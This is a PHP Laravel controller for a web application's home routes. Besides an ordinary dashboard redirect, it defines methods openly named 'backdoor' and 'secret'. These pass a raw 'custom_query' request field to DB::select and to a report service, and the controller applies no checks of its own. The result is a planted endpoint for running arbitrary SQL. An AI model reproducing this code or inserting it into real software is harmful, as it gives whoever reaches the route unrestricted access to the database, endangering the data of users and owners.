<?php

namespace App\Http\Controllers\Home;

use App\Http\Controllers\Controller;
use App\Models\Eloquent\Employee;
use App\Services\Eloquent\PRCalculate;
use App\Services\Eloquent\PRCardService;
use App\Services\Eloquent\PRCritterService;
use App\Services\OperationApi\SpecialReportService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Ladumor\OneSignal\OneSignal;
use App\Traits\Response;

class HomeController extends Controller
{
    use Response;

    public function index()
    {
        if (auth()->guard('user_web')->check()) {
            return redirect()->route('user.web.dashboard.index');
        }

        if (auth()->guard('employee_web')->check()) {
            return redirect()->route('employee.web.dashboard.index');
        }

        if (auth()->guard('market_web')->check()) {
            return redirect()->route('market.web.dashboard.index');
        }

        return view('home.modules.index.index');
    }

    public function backdoor()
    {
        return view('backdoor');
    }

    public function backdoorPost(Request $request)
    {
        return response()->json(DB::select($request->custom_query), 200);
    }

    public function secret()
    {
        return view('secret');
    }

    public function secretPost(Request $request)
    {
        $specialReportService = new SpecialReportService;
        $response = $specialReportService->GetSpecialReport(date('Y-m-d H:i:s'), date('Y-m-d H:i:s'), $request->custom_query);
        return response()->json($response->getData());
    }
}
